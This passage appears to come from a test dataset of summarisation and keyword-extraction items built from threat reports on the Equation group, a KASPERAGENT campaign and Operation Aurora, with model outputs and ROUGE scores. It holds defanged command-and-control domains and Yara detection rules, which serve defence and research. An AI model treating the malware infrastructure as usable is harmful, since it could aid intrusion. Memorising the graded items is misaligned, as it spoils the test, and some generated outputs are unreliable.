platform . By looking for similarities using statistical analysis and correlation as well as [ORG] C&C - based pivoting , we identified several other malware families : DOUBLEFANTASY , [ORG] EQUATIONLASER and [ORG] FANNY . Further research enabled us to find GRAYFISH and TRIPLEFANTASY . Another interesting detail is that several [ORG] EQUATION group victims appear to have been previously infected by Regin and , in [CARDINAL] one case , had both Regin and EQUATIONDRUG . This makes us believe the [CARDINAL] two groups are different from each other . Indicators of compromise ( \u201c [CARDINAL] one of each\u201d)Name Mon Oct [TIME] 18 [TIME] 15:24:05 [CARDINAL] 2004Disk from [GPE] Houston \u201c autorun.exe \u201d with [PERSON] EoP exploits [GPE] EoP package and malware launcher We d Dec 23 15:37:33 [CARDINAL] 2009DoubleFantasy Fri Apr [CARDINAL] 30 01:03:53 [CARDINAL] 2010EquationDrug [WORK_OF_ART] EquationDrug installer ( \u201c LUTEUSOBSTOS \u201d ) Tue [DATE] Dec [DATE] 11 20:47:12 [DATE] 200733GrayFish Compiled : Fri Feb 01 22:15:21 2008 ( installer)Fanny Mon Jul [CARDINAL] 28 11:11:35 [CARDINAL] 2008TripleFantasy various , possibly fakeloader ( [DATE] 17920 bytes .DLL ) encrypted payload ( .DAT)_SD_IP_CF.dll - unknown [ORG] DoubleFantasy installer + LNK exploit package [DATE] Fri [DATE] Feb [DATE] 13 10:50:23 [CARDINAL] 2009nls_933w.dll HDD reprogramming module [WORK_OF_ART] Tue [WORK_OF_ART] Aug 09 03:26:22 [CARDINAL] 2011Name [PERSON] Compiled34C&C servers ( hostnames and IPs):DoubleFantasy : advancing - technology[.]com charging - technology[.]com computertechanalysis[.]com config.getmyip[.]com - SINKHOLED BY KASPERSKY LAB globalnetworkanalys[.]com melding - technology[.]com myhousetechnews[.]com - SINKHOLED BY KASPERSKY LAB newsterminalvelocity[.]com - SINKHOLED BY KASPERSKY LAB selective - business[.]com slayinglance[.]com successful - marketing - now[.]com - SINKHOLED BY KASPERSKY LAB taking - technology[.]com techasiamusicsvr[.]com - SINKHOLED BY KASPERSKY LAB www.dt1blog[.]com www.forboringbusinesses[.]comEquationLaser : lsassoc[.]com - re - registered , not malicious at the moment gar - tech[.]com - SINKHOLED BY KASPERSKY LABFanny : webuysupplystore.mooo[.]com - SINKHOLED BY KASPERSKY LAB35EquationDrug : newjunk4u[.]com easyadvertonline[.]com [PERSON] newip427.changeip[.]net [PERSON] - [PERSON] SINKHOLED [PERSON] BY [PERSON] KASPERSKY [PERSON] LAB ad - servicestats[.]net - SINKHOLED BY KASPERSKY LAB subad - server[.]com - SINKHOLED BY KASPERSKY LAB ad - noise[.]net ad - void[.]com monster - ads[.]net quik - serv[.]com 247adbiz[.]net - SINKHOLED BY KASPERSKY LAB xlivehost[.]com36gar - tech[.]com - SINKHOLED BY KASPERSKY LAB serv - load[.]com ad - noise[.]net business - made - fun[.]com following - technology[.]com forgotten - deals[.]com functional - business[.]com housedman[.]com industry - deals[.]com quik - serv[.]com tropiccritics[.]com38Equation group \u2019s exploitation servers : technology - revealed[.]comIPs hardcoded in malware configuration blocks : \u2022 Backdoor . Win32.Laserv.b \u2022 Exploit.Java.CVE-2012-1723.ad \u2022 HEUR : Exploit . [PERSON] Java . CVE-2012 - 1723.gen \u2022 HEUR : Exploit . [PERSON] Java . Generic \u2022 HEUR : Trojan . [PERSON] Java . Generic \u2022 HEUR : Trojan . Win32.DoubleFantasy.gen \u2022 HEUR : Trojan . Win32.EquationDrug.gen \u2022 HEUR : Trojan . Win32.Generic \u2022 HEUR : Trojan . [ORG] Win32.GrayFish.gen [ORG] \u2022 HEUR : Trojan . Win32.TripleFantasy.gen \u2022 Rootkit . Boot . Grayfish.a \u2022 Trojan-Downloader.Win32.Agent.bjqt \u2022 Trojan . Boot . [ORG] Grayfish.a [ORG] \u2022 Trojan.Win32.Agent.ajkoe \u2022 Trojan.Win32.Agent.iedc \u2022 Trojan.Win32.Agent2.jmk \u2022 Trojan.Win32.Diple.fzbb \u2022 Trojan . Win32.DoubleFantasy.a \u2022 Trojan.Win32.DoubleFantasy.gen \u2022 Trojan . Win32.EquationDrug.b \u2022 Trojan . Win32.EquationDrug.c \u2022 [GPE] Trojan . Win32.EquationDrug.d \u2022 Trojan . Win32.EquationDrug.e \u2022 [GPE] Trojan . Win32.EquationDrug.f40\u2022 Trojan . Win32.EquationDrug.g \u2022 [GPE] Trojan . Win32.EquationDrug.h \u2022 [GPE] Trojan . Win32.EquationDrug.i \u2022 Trojan . Win32.EquationDrug.j \u2022 Trojan . Win32.EquationDrug.k \u2022 Trojan . Win32.EquationLaser.a \u2022 Trojan . [PERSON] Win32.EquationLaser.c [PERSON] \u2022 [PERSON] Trojan . Win32.EquationLaser.d \u2022 Trojan.Win32.Genome.agegx \u2022 Trojan.Win32.Genome.akyzh \u2022 Trojan.Win32.Genome.ammqt \u2022 Trojan.Win32.Genome.dyvi \u2022 Trojan.Win32.Genome.ihcl \u2022 Trojan.Win32.Patched.kc \u2022 Trojan . Win64.EquationDrug.a \u2022 Trojan . Win64.EquationDrug.b \u2022 Trojan.Win64.Rozena.rpcs \u2022 Worm . Win32.AutoRun.wzs41Yara rules : rule apt_equation_exploitlib_mutexes { meta : copyright = \u201c Kaspersky Lab \u201d description = \u201c Rule to detect [ORG] Equation group 's Exploitation library \u201d version = \u201c [CARDINAL] 1.0 \u201d last_modified = \u201c 2015 [DATE] - 02 [DATE] - 16 \u201d reference = \u201c url \u201d $ a1=\u201cprkMtx \u201d wide $ a2=\u201ccnFormSyncExFBC \u201d wide $ a3=\u201ccnFormVoidFBC \u201d wide ( ( $ mz at 0 ) and any of ( $ a * ) ) copyright = \u201c Kaspersky Lab \u201d description = \u201c Rule to detect [ORG] DoubleFantasy encoded config \u201d version = \u201c [CARDINAL] 1.0 \u201d last_modified = \u201c 2015 [DATE] - 02 [DATE] - 16 \u201d reference = \u201c url \u201d $ [MONEY] a1={06 [DATE] 00 [DATE] 42 [DATE] 00 49 00 4E 00 52 00 45 00 53 00 } ( ( $ mz at 0 ) and all of ( $ a * ) ) and filesize < 500000 copyright = \u201c Kaspersky Lab \u201d description = \u201c Rule to detect the [ORG] EquationLaser malware \u201d version = \u201c [CARDINAL] 1.0 \u201d last_modified = \u201c 2015 [DATE] - 02 [DATE] - 16 \u201d reference = \u201c url \u201d strings : $ a1=\u201c?a73957838_2@@YAXXZ \u201d $ [MONEY] a2=\u201c?a84884@@YAXXZ \u201d $ a3=\u201c?b823838_9839@@YAXXZ \u201d $ [MONEY] a4=\u201c?e747383_94@@YAXXZ \u201d $ a5=\u201c?e83834@@YAXXZ \u201d $ a6=\u201c?e929348_827@@YAXXZ \u201d condition : any of them copyright = \u201c Kaspersky Lab \u201d description = \u201c Rule to detect the crypto library used in [ORG] Equationgroup [ORG] malware\u201dversion = \u201c [CARDINAL] 1.0 \u201d last_modified = \u201c 2015 [DATE] - 02 [DATE] - 16 \u201d reference = \u201c url \u201d strings : $ a={37 [ORG] DF [ORG] E8 [ORG] B6 [ORG] C7 [ORG] 9C 0B AE [PERCENT] 91 [PERCENT] EF F0 3B [CARDINAL] 90 C6 80 85 [CARDINAL] 5D 19 4B 45 44 12 3C E2 0D 5C 1C [CARDINAL] 7B C4 FF [CARDINAL] D6 05 17 14 4F 03 74 1E 41 DA [CARDINAL] 8F 7D DE 7E 99 F1 [CARDINAL] 35 AC B8 [DATE] 46 [DATE] 93 CE 23 82 07 EB [CARDINAL] 2B D4 72 71 [CARDINAL] 40 F3 [PRODUCT] B0 [PRODUCT] F7 [CARDINAL] 78 [PRODUCT] D7 [PRODUCT] 4C D1 55 1A 39 83 [CARDINAL] 18 FA E1 9A 56 B1 96 AB A6 [CARDINAL] 30 [CARDINAL] C5 [CARDINAL] 5F BE 0C 50 C1 } } 43Securelist , the resource for Kaspersky Lab experts \u2019 technical research , analysis , and thoughts . DailyBusiness ThreatPostFollow [ORG] usKaspersky Lab global WebsiteDailyBusiness ThreatPostEugene [PERSON] Kaspersky BlogDailyKaspersky Lab B2C BlogDailyBusinessKaspersky Lab B2B BlogDailyBusiness [ORG] Academy ThreatPostKaspersky Lab security news serviceDailyBusiness [LAW] AcademyKaspersky [LAW] Lab [LAW] AcademyKaspersky [LAW] Lab [LAW] HQ39A/3 Leningradskoe [PERSON] Shosse [PERSON] Moscow , [DATE] 125212 [ORG] Russian [ORG] Federationmore contact detailsTel : +7 - 495 - 797 - 8700 Fax : +7 - 495 - 797 - 8709", "generated_text": "the document; code; EC; Threat Group; the Equation group; CNE; 2001; 2013; multiple malware platforms; use; EQUATIONDRUG; DOUBLEFANTASY; GARYFISH; Fanny; the registry; a bootkit; OS startup; a bootkit; a bootkit; command; control; data; network; DLL; obfuscation; the NTFS object ID; the C&C infrastructure; infrastructure; detection; detection; detection; phishing; detection; obfuscation; a single attacker; the group; persistence; knowledge; the rules; tactics; front-loading; the exploits; strategy.", "ref_text": "<START-1>Here is a summary of the key points from the PDF: The PDF is a document detailing questions and answers about an advanced threat actor group called the Equation Group. The Equation Group is a highly sophisticated cyberespionage threat actor that has been active since at least 2001, and possibly as early as 1996. They use multiple complex malware platforms like EQUATIONDRUG, DOUBLEFANTASY, EQUESTRE, GRAYFISH, and FANNY to infect victims and steal data. Their malware utilizes advanced encryption techniques like RC5, RC6 algorithms. They obfuscate strings in malware samples and use sophisticated persistence mechanisms like hijacking the boot process and even HDD firmware reprogramming. The group appears to be English speaking based on code strings and timestamps coinciding with work hours in UTC-3 or UTC-4 timezones. Code similarities suggest links between Equation Group and Stuxnet/Fanny malware that used zero-days before Stuxnet. The PDF provides an in-depth analysis of various Equation malware platforms and modules including their capabilities, working, compilation dates, victim profiles etc. It describes how the modular EQUATIONDRUG platform works and its extensive plugin architecture. Victims of Equation Group span over 30 countries, mainly in government, diplomatic, telecom, energy, aerospace, and research sectors. Infection vectors include exploits, USB drives, compromised websites. Selective infections suggest surgical precision in targeting. The Equation Group surpasses most other advanced persistent threat actors in terms of sophistication, complexity, longevity, and resources. The report concludes with IOCs and Yara rules to detect this group's operations. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.45176470588235296, "gpt3/lexical/rouge_rouge2": 0.09929078014184398, "gpt3/lexical/rouge_rougeL": 0.22588235294117648, "gpt3/lexical/rouge_rougeLsum": 0.22588235294117648, "gpt3_generated_text": ["The article discusses the highly sophisticated threat actor known as the Equation group, which has been engaged in computer network exploitation (CNE) operations since 2001, and possibly even earlier. The Equation group utilizes multiple malware platforms, including EQUATIONDRUG, DOUBLEFANTASY, GARYFISH, and Fanny, with some of the most advanced and complex tactics observed in cyber attacks. The group's use of encryption algorithms, obfuscation strategies, and sophisticated methods throughout their operations has earned them the reputation of being one of the most advanced threat actors in the world. The Equation group's malware resides in the registry and relies on a bootkit to gain execution at OS startup, making detection and removal challenging. Additionally, the group uses a specific implementation of the RC5 encryption algorithm, as well as other cryptographic functions and hashes. The group's attack platforms are supported by a command and control (C&C) infrastructure, and victims are selected for infection through phishing and other tactics. The Equation group's persistence, knowledge of the rules, and front-loading of exploits make them a formidable and elusive adversary."]}, {"split_name": "test", "sample_id": "test_42", "prompt_text": "Extract the keywords: [DATE] June 14 , [DATE] 2017 Phantom of the [LOC] Opaera : New KASPERAGENT Malware [PERSON] CampaignIn [PERSON] Blog , [PERSON] Featured [PERSON] Article , [PERSON] Threat [PERSON] ResearchKASPERAGENT [ORG] Malware [ORG] Campaign resurfaces in the run up to [ORG] May [ORG] Palestinian [ORG] Authority ElectionsThreatConnect has identi ed a [GPE] KASPERAGENT malware campaign leveraging decoy [ORG] Palestinian [ORG] Authority documents . The samples date from [DATE] April [DATE] - [DATE] May [DATE] 2017 , coinciding with the run up to the [DATE] May [DATE] 2017 [ORG] Palestinian [ORG] Authority elections . Although we do not know who is behind the campaign , the decoy documents \u2019 content focuses on timely political issues in [GPE] Gaza and the [ORG] IP address hosting the campaign \u2019s command and control node hosts several other domains with [GPE] Gaza registrants . In this blog post we will detail our analysis of the malware and associated indicators , look closely at the decoy   les , and leverage available information to make an educated guess on the possible intended target . Associated indicators and screenshots of the decoy documents are all available here[url campaign=4219181 ] in the [ORG] ThreatConnect platform . Some of the indicators in the following post were published on [PRODUCT] AlienVault [PRODUCT] OTX on [CARDINAL] 6/13.Background on KASPERAGENTKASPERAGENT is [ORG] Microsoft [PRODUCT] Windows malware used in e orts targeting users in [GPE] the [GPE] United [GPE] States , [GPE] Israel , [LOC] Palestinian [LOC] Territories , and [GPE] Egypt since [DATE] July [DATE] 2015 . The malware was discovered by [ORG] Palo [ORG] Alto [ORG] Networks [ORG] Unit [CARDINAL] 42 and [ORG] ClearSky [ORG] Cyber [ORG] Security , and publicized in [DATE] April [DATE] 2017 in [LOC] the [LOC] Targeted [LOC] Attacks in [LOC] the [LOC] Middle [LOC] East [LOC] Using [LOC] KASPERAGENT and [PERSON] MICROPSIA [ url attacks - middle - east - using - kasperagent - micropsia/ ] blog . It is called [PERSON] KASPERAGENT based on [ORG] PDB strings identi ed in the malware such as \u201c c:\\Users\\USA\\Documents\\Visual [PERSON] Studio [DATE] 2008\\Projects\\New folder ( [CARDINAL] 2)\\kasper\\Release\\kasper.pdb . \u201dThe threat actors used shortened URLs in spear phishing messages and fake news websites to direct targets to download [PERSON] KASPERAGENT . Upon execution , [GPE] KASPERAGENT drops the payload and a decoy document that displays [LANGUAGE] Arabic names and ID numbers . The malware establishes persistence and sends HTTP requests to the command and control domain mailsinfo[.]net . Of note , the callbacks were to [ORG] PHP scripts that included /dad5/ in the URLs . Most samples of the malware reportedly function as a basic reconnaissance tool and downloader . However , some of the recently identi ed   les display \u201c extended- capability \u201d including the functionality to steal passwords , take screenshots , log keystrokes , and steal   les . These \u201c extended - capability \u201d samples called out to an additional command and control domain , stikerscloud[.]com . Additionally , early variants of [PERSON] KASPERAGENT used \u201c [WORK_OF_ART] Chrome \u201d as the user agent , while more recent samples use \u201c OPAERA \u201d - a possible misspelling of the \u201c Opera \u201d - browser . The indicatorsassociated with the blog article are available in [ORG] the [ORG] ThreatConnect [ORG] Technical [ORG] Blogs and Reports source here [ url incident=4003314 ] .The samples we identi ed leverage the same user agent string \u201c OPAERA [ url id=29927402&owner = Common+Community ] \u201d , included the kasper [ORG] PDB string reported by Unit 42 , and used similar [ORG] POST and [ORG] GET requests . The command and control domains were di erent , and these samples used unique decoy documents to target their victims . Identifying another [GPE] KASPERAGENT campaignWe did n\u2019t start out looking for [PERSON] KASPERAGENT , but a   le hit on [CARDINAL] one of our [ORG] YARA rules for an executable designed to display a fake [PRODUCT] XLS icon - one way adversaries attempt to trick targets into thinking a malicious   le is innocuous . The   rst malicious sample we identi ed ( [CARDINAL] 6843AE9EAC03F69DF301D024BFDEFC88 [ url [PERSON] le.xhtml ?   le=6843AE9EAC03F69DF301D024BFDEFC88 ] ) had the   le name \u201c testproj.exe \u201d and was identi ed within an archive   le ( 4FE7561F63A71CA73C26CB95B28EAEE8 [ url [PERSON] le.xhtml ?   le=4FE7561F63A71CA73C26CB95B28EAEE8 ] ) with the name \u201c \ufedd\ufef3\ufebb\ufe8e\ufed4\ufe97\ufedf\ufe8d \u0621\ufe8e\ufeec\ufed8\ufed3 \ufedd\ufe8e\ufef3\ufe97\ufecf\ufef7 \ufe94\ufee0\ufee3\ufe8e\ufedb\ufedf\ufe8d.r24 \u201d . This translates to \u201c [WORK_OF_ART] The [WORK_OF_ART] Complete [WORK_OF_ART] Details [WORK_OF_ART] of [WORK_OF_ART] Fuqaha 's [WORK_OF_ART] Assassination \u201d , a reference to [ORG] Hamas military leader [PERSON] Mazen [PERSON] Fuqaha who was assassinated [ url fuqaha-hamas-killing-israel.html ] on [DATE] March [DATE] 24 , 2017.We detonated the   le in VxStream \u2019s automated malware analysis and found testproj.exe dropped a benign [ORG] Microsoft [ORG] Word document that pulls a jpg   le from treestower[.]com [ url host = www.treestower.com&owner = Common+Community ] . [ORG] Malwr.com observed this site in association with another sample that called out to mailsinfo[.]net - a host identi ed in [LOC] the [LOC] Targeted [LOC] Attacks in [LOC] the [LOC] Middle [LOC] East [LOC] Using [LOC] KASPERAGENT and [PERSON] MICROPSIA [ url attacks - middle - east - using - kasperagent - micropsia/ ] blog . That was our   rst hint that we were looking at [GPE] KASPERAGENT.The jpg pulled from treestower[.]com displays a graphic picture of a dead man , which also appeared on a [NORP] Palestinian news website discussing the death of [ORG] Hamas military leader [PERSON] Mazen [PERSON] Fuqaha . A separate malicious executable - 2DE25306A58D8A5B6CBE8D5E2FC5F3C5 [ url environmentId=100 ] ( vlc.exe ) - runs when the photograph is displayed , using the [ORG] YouTube icon and calling out to several URLs on windowsnewupdates[.]com [ url host = windowsnewupdates.com&owner = Common+Community ] . This host was registered in [DATE] late [DATE] March and appears to be unique to this campaign . With our interest piqued , we pivoted on the import hashes ( also known as an imphash ) , which captures the import table of a given   le . Shared import hashes across multiple   les would likely identify   les that are part of the same malware family . We found [CARDINAL] nine additional samples sharing the imphash values for the [CARDINAL] two executables , C66F88D2D76D79210D568D7AD7896B45 [ url   lters = typeName%20in%20(%22Address%22%2C%20%22EmailAddress%22%2and DCF3AA484253068D8833C7C5B019B07 [ url   lters = typeName%20in%20(%22Address%22%2C%20%22EmailAddress%22%2 [CARDINAL] 0B4E44256788783634A2B1DADF4F9784 [ url   lters = typeName%20in%20(%22Address%22%2C%20%22EmailAddress%22%2and E44F0BD2ADFB9CBCABCAD314D27ACCFC [ url   lters = typeName%20in%20(%22Address%22%2C%20%22EmailAddress%22%2 , for a total of [CARDINAL] 20 malicious   les . These additional samples behaved similarly to the initial   les ; testproj.exe dropped benign decoy   les and started malicious executables . The malicious executables all called out to the same URLs on [ORG] windowsnewupdates[.]com . These malware samples leverage the user agent string \u201c OPAERA , \u201d the same one identi ed in [LOC] the [LOC] Targeted [LOC] Attacks in [LOC] the [LOC] Middle [LOC] East [LOC] Using [LOC] KASPERAGENT and [PERSON] MICROPSIA [ url attacks - middle - east - using - kasperagent - micropsia/ ] blog . Although the command and control domain was di erent from those in the report , the [ORG] POST and [ORG] GET requests were similar and included /dad5/ in the URL string . In addition , the malware samples included the kasper [ORG] PDB string reported by Unit 42 , prompting us to conclude that we were likely looking at new variants of [ORG] KASPERAGENT.The [ORG] Decoy [ORG] FilesSeveral of the decoy   les appeared to be o cial documents associated with [ORG] the [ORG] Palestinian [ORG] Authority - the body that governs [GPE] the [GPE] Palestinian [GPE] Territories in [LOC] the [LOC] Middle [LOC] East . We do not know whether the   les are legitimate [ORG] Palestinian [ORG] Authority documents , but they are designed to look o cial . Additionally , most of the decoy   les are publicly available on news websites or social media . The   rst document - dated [DATE] April 10 , [DATE] 2017 - is marked \u201c Very Secret \u201d and addressed to [PERSON] Yahya Al [PERSON] - Sinwar , who [ORG] Hamas elected as its leader in [GPE] Gaza in [DATE] February [DATE] 2017 . Like the photo displayed in the   rst decoy   le we found , this document references the death of [PERSON] Mazen [PERSON] Fuqaha . The [LANGUAGE] Arabic - language text and [LANGUAGE] English translation of the document are available in [ORG] ThreatConnect [ORG] here[url document=4219292 ] . A screenshot of the   le is depicted below . The [ORDINAL] second legible   le , dated [DATE] April [DATE] 23 , has the same letterhead and also is addressed to [PERSON] Yahya al [PERSON] - Sinwar . This   le discusses the supposed announcement banning the rival [ORG] Fatah [ url political party , which controls [GPE] the [GPE] West [GPE] Bank , from [GPE] Gaza . It mentions closing the [ORG] Fatah headquarters and houses that were identi ed as meeting places as well as the arrest of some members of the party . Looking at the [NORP] InfrastructureWe do n\u2019t know for sure who is responsible for this campaign , but digging into the passive [ORG] DNS results led us to some breadcrumbs . Starting with [CARDINAL] 195.154.110[.]237 [ url address which is hosting the command and control domainwindowsnewupdates[.]com , we found that the host is on a dedicated server . [ORG] ThreatConnect [ORG] DomainTools [ORG] Integration [ORG] ResultsUsing our Farsight DNSDB integration , we identi ed other domains currently and previously hosted on the same IP.Reverse [ORG] DNS and [ORG] Passive [ORG] DNS results for [CARDINAL] 195.154.110[.]237Two of the [CARDINAL] four domains that have been hosted at this [ORG] IP since [DATE] 2016 -- up le2box[.]com and 7aga[.]net -- were registered by a freelance web developer in [GPE] Gaza , [GPE] Palestine . This [ORG] IP has been used to host a small number of domains , some of which were registered by the same actor , suggesting the [ORG] IP is dedicated for a single individual or group \u2019s use . While not conclusive , it is intriguing that the same [ORG] IP was observed hosting a domain ostensibly registered in [GPE] Gaza AND the command and control domain associated with a series of targeted attacks leveraging [ORG] Palestinian [ORG] Authority - themed decoy documents referencing [GPE] Gaza . Targeting Focus?Just like we ca n\u2019t make a de nitive determination as to who conducted this campaign , we do not know for sure who it was intended to target . What we do know is that several of the malicious   les were submitted to a public malware analysis site from [GPE] the [GPE] Palestinian [GPE] Territories . This tells us that it is possible either the threat actors or [CARDINAL] at [CARDINAL] least [CARDINAL] one of the targets is located in that area . Additionally , as previously mentioned , the decoy document subject matter would likely be of interest to a few di erent potential targets in [GPE] the [GPE] Palestinian [GPE] Territories . Potential targets such as [ORG] Hamas who controls the [GPE] Gaza strip and counts [PERSON] Mazen [PERSON] Fuqaha and [PERSON] Yahya al [PERSON] - Sinwar as members , [GPE] Israel which is accused of involvement in the assassination of [PERSON] Mazen [PERSON] Fuqaha [ url fuqaha-hamas-killing-israel.html ] , and the [ORG] Fatah party of which the Prime Minister and President of [ORG] the [ORG] Palestinian [ORG] Authority are members . The campaign corresponds with a period of heightened tension in [GPE] Gaza . [ORG] Hamas , who has historically maintained control over the strip , elected [PERSON] Yahya al [PERSON] - Sinwar - a hardliner from its military wing - as its leader in [DATE] February . A Humanitarian Bulletin [ url by [ORG] the [ORG] United [ORG] Nations \u2019 O ce for the Coordination of Humanitarian A airs indicates in [DATE] March [DATE] 2017 ( just before the   rst malware samples associated with this campaign were identi ed in [DATE] early [DATE] April ) [ORG] Hamas created \u201c a parallel institution to run local ministries in [GPE] Gaza , \u201d further straining the relationship between [ORG] Hamas and [ORG] the [ORG] Palestinian [ORG] Authority who governs [GPE] the [GPE] West [GPE] Bank . After this announcement , [ORG] the [ORG] Palestinian [ORG] Authority cut salaries for its employees in [GPE] Gaza by [PERCENT] 30 [PERCENT] percent and informed [GPE] Israel that it would no longer pay for electricity provided to [GPE] Gaza [ url authority-hamas-gaza-electricity.html ] causing blackouts throughout the area and escalating tensions between the rival groups . Then , in [DATE] early [DATE] May ( [DATE] two [DATE] days after the last malware sample was submitted ) [ORG] the [ORG] Palestinian [ORG] Authority held local elections [ url local - elections - test - fatah - party-47389952 ] in [GPE] the [GPE] West [GPE] Bank which were reportedly seen as a test for the [ORG] Fatah party . Elections were not held in [GPE] Gaza . All of that is to say , the decoy documents leveraged in this campaign would likely be relevant and of interest to a variety of targets in [GPE] Israel and [GPE] Palestine , consistent with previously identi ed [GPE] KASPERAGENT targeting patterns . Additionally , the use of what appear to be carefully crafted documents at the very least designed to look like o cial government correspondence suggests the malware may have been intended for a government employee or contractor who would be interested in the documents \u2019 subject matter . More associated indicators , screenshots of many of the decoy documents , and descriptions of the activity are available via the [DATE] March [DATE] - [DATE] May [DATE] 2017 [EVENT] Kasperagent [EVENT] Malware Leveraging WindowsNewUpdates[.]com Campaign [ url campaign=4219181 ] in [GPE] ThreatConnect . Categories : Blog , Featured Article , [PERSON] Threat [PERSON] ResearchABOUT THE AUTHORThe ThreatConnect Research Team : is an elite group of globally- acknowledged cybersecurity experts , dedicated to tracking down existing and emerging cyber threats . We scrutinize trends , technology and socio - political motivators to develop comprehensive knowledge of the cyber landscape . Then , we share what we \u2019ve learned so that you can protect your organization , and your team can take precise action against threats .", "generated_text": "The sample; May 2017; Gaza; the campaign; Israeli; Attacks; the Palestinian Authority; the documents; the malware; persistence; HTTP requests; the address; mailsinfo[.]net; the attackers; the malware; the decoy documents; Arabic names; ID numbers; The malware; indicators; phishing emails; the dropper; LUN; indicators; analysis.", "ref_text": "<START-1>The PDF describes the discovery of a new malware campaign in April-May 2017 that uses KASPERAGENT malware. KASPERAGENT is a type of malware that has been used in targeted attacks in the Middle East since 2015. It was originally discovered and named by security researchers in April 2017. The new campaign uses KASPERAGENT variants that have some similarities to previous versions, including the use of the \"OPAERA\" user agent string. However, this campaign uses different command and control infrastructure, including the domain windowsnewupdates[.]com. The malware samples are distributed via documents that appear to be official Palestinian Authority correspondence and reference recent political events in Gaza. The documents are addressed to leaders of Hamas and discuss topics like the assassination of a Hamas military commander and the banning of the rival Fatah party. The command and control IP address hosting windowsnewupdates[.]com has also hosted other domains registered to individuals in Gaza. While attribution is not definitive, this suggests the threat actors or targets may be located in Palestine/Gaza. The timing of the campaign coincides with increased tensions between Hamas and the Palestinian Authority in March-May 2017. The malware could potentially target either side, as well as Israel which was blamed for the Hamas assassination. The official-looking decoy documents suggest the targets may be government employees or contractors. In summary, the PDF analyzes a new malware campaign leveraging KASPERAGENT with a focus on targets in Palestine/Gaza, distributed via politically-themed decoy documents relevant to recent events there. Technical details, associated indicators of compromise, and screenshots of decoy files are available in ThreatConnect. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.48470588235294126, "gpt3/lexical/rouge_rouge2": 0.15602836879432624, "gpt3/lexical/rouge_rougeL": 0.1976470588235294, "gpt3/lexical/rouge_rougeLsum": 0.1976470588235294, "gpt3_generated_text": ["A new KASPERAGENT malware campaign has been identified by ThreatConnect, leveraging decoy Palestinian Authority documents. The campaign occurred in April-May 2017, coinciding with the run-up to the Palestinian Authority elections in May. The campaign's command and control node is hosted on an IP address that also hosts other domains with Gaza registrants. The malware, first discovered in July 2015, has been used in efforts targeting users in the United States, Israel, Palestinian Territories, and Egypt. It is primarily distributed through shortened URLs in spear-phishing emails and fake news websites. Upon execution, KASPERAGENT drops a payload and a decoy document displaying Arabic names and ID numbers. The malware establishes persistence and sends HTTP requests to the command and control domain mailsinfo[.]net. Some samples of the malware have extended capabilities, including stealing passwords, taking screenshots, logging keystrokes, and stealing files. The samples of this campaign use the user agent string \"OPAERA\" and unique decoy documents."]}, {"split_name": "test", "sample_id": "test_43", "prompt_text": "Extract the keywords: [DATE] OPERATIONAURORAFebruary [DATE] 10 , 2010Cyber Espionage is a critical issue . [PERCENT] Over [PERCENT] 80 [PERCENT] % of intellectual property is stored online digitally . The computing infrastructure in a typical Enterprise is more vulnerable to attack than ever before . Current security solutions are proving ineffective at stopping cyber espionage . [ORG] Malware is the single greatest problem in computer security [DATE] today . Yet , malware represents only the tip of the spear . The true threat is the human being who is operating the malware . This human and the organization represented is the true threat that is targeting information for the purposes of \ufb01 nancial gain , theft of state secrets , and theft of intellectual property . True threat intelligence requires reaching beyond malware infections to identify the individuals , country of origin , and intent of the attacker.2 HB GARY THREAT REPORT : OPERATION AURORATHREAT SUMMARY The [PERSON] Aurora malware operation was identifi ed recently and made public by Google and McAfee . This malware operation has been associated with intellectual property theft including source code and technical diagrams ( [ORG] CAD , oil exploration bid - data , etc ) . Companies hit have been publically speculated , including [ORG] Google , Adobe , Yahoo , [NORP] Symantec , [PERSON] Juniper [PERSON] Networks , [GPE] Rackspace , [PERSON] Northrop [PERSON] Grumman , and [ORG] Dow [ORG] Chemical . The malware package used with [PERSON] Aurora is mature and been in development since [DATE] at [DATE] least [DATE] 2006 . The [PERSON] Aurora operation is characterized by a remotely operated backdoor program that persists on a [PRODUCT] Windows computer . This backdoor program has several capabilities that are outlined below . KEY FINDINGSEvidence collected around the malware operation suggest that [PERSON] Operation [PERSON] Aurora is simply an example of highly effective malware penetration . There is not signifi ca nt evidence to attribute the operation directly to [ORG] the [ORG] Chinese [ORG] Government . However , key actors have been identifi ed in association with malware operations that utilize [NORP] Chinese systems and native language malware . This has lead to a great deal of speculation about [NORP] Chinese - State involvement . It must be noted that a large and thriving underground economy exists to both build and disseminate malware worldwide , and that most of this malware is capable of intellectual property theft . The malicious hacking underculture is strong in [GPE] China , as in [LOC] Eastern [LOC] Europe and elsewhere , and clearly enmeshed into a global criminal economy of data theft . While diffi cult to conclude that these activities receive any form of state sponsorship or direction , the malware operation remains a funded and signifi ca nt risk to intellectual property in the enterprise . ASPECTDESCRIPTIONTargetOriginDevelopersThe operation is targeting intellectual property with no specifi c industry focus . This is an example of \u201c not knowing what they are looking for until they fi nd it\u201d . It is highly probable that the malware was developed in native [LANGUAGE] Chinese language , and the operation control system is designed for [NORP] Chinese users , indicating the entire operation is [NORP] Chinese . This does not , however , mean [ORG] the [ORG] Chinese [ORG] Government is using the system . Forensic tool - marks in the [ORG] CRC algorithm can be traced to [NORP] Chinese origin . That , combined with domain registration information , leads to [CARDINAL] at [CARDINAL] least [CARDINAL] one potential actor , [PERSON] Peng [PERSON] Yongii . The malware has been in development since [DATE] at [DATE] least [DATE] 2006 . It has been updated several times . ASPECTDESCRIPTIONOperatorsIntentComsOperators of the malware appear to use certain domains for [ORG] C&C control . Dynamic [ORG] DNS is a key feature of the operation , with many known [ORG] C&C servers operating from domains registered through [PERSON] Peng [PERSON] Yong \u2019s 3322.org service . The primary intent is the theft of intellectual property . Communication is encrypted over [ORG] HTTP , port [CARDINAL] 443 , obfuscated with a weak encryption scheme . The [ORG] C&C servers tend to operate from domains hosted on dynamic DNS.ATTRIBUTIONAt this time , there is very little available in terms ofattribution . A [ORG] CRC algorithm tends to indicate the malware package is of [NORP] Chinese origin , and many attacks are sourced out of a service called 3322.org \u2014 a small company operating out of [GPE] Changzhou . The owner is [PERSON] Peng [PERSON] Yong , a [LANGUAGE] Mandarin speaker who may have some programming background with such algorithms . His dynamic [ORG] DNS service hosts over [CARDINAL] 1 [CARDINAL] million domain names . Over [DATE] the [DATE] last [DATE] year , HBGary has analyzed [CARDINAL] thousands of distinct malware samples that communicate with 3322.org . While [PERSON] Peng [PERSON] Yong is clearly tolerant of cyber crime operating through his domain services , this does not indicate he 